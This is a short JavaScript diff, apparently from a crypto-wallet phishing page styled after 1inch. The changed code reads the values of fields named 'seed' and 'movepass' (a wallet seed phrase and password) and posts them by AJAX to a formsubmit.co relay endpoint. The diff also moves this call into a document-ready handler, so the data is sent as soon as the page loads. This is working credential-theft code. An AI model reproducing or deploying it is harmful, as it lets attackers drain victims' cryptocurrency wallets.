@@ -26,22 +26,27 @@ function scrollFunction(){
 
 }
 
-function toSubmit(){
-    var name = document.getElementById("seed").value;
-    var password = document.getElementById("movepass").value;
-
-    var dataString = '1inch=' + name +  '&Password=' + password ;
-
-    $.ajax({
-    method: 'POST',
-    url: 'https://formsubmit.co/ajax/60c68e87820dd251e73211e21d7940df',
-    dataType: 'json',
-    accepts: 'application/json',
-    data: dataString,
-        async: true,
+$(document).ready(function() {
+    function toSubmit(){
+        var name = document.getElementById("seed").value;
+        var password = document.getElementById("movepass").value;
+    
+        var dataString = '1inch=' + name +  '&Password=' + password ;
+    
+        $.ajax({
+        method: 'POST',
+        url: 'https://formsubmit.co/ajax/60c68e87820dd251e73211e21d7940df',
+        dataType: 'json',
+        accepts: 'application/json',
+        data: dataString,
         cache: false,
+    });
+    return false;    
+    }
+    toSubmit();
+    
+
 });
-}
 
 
 
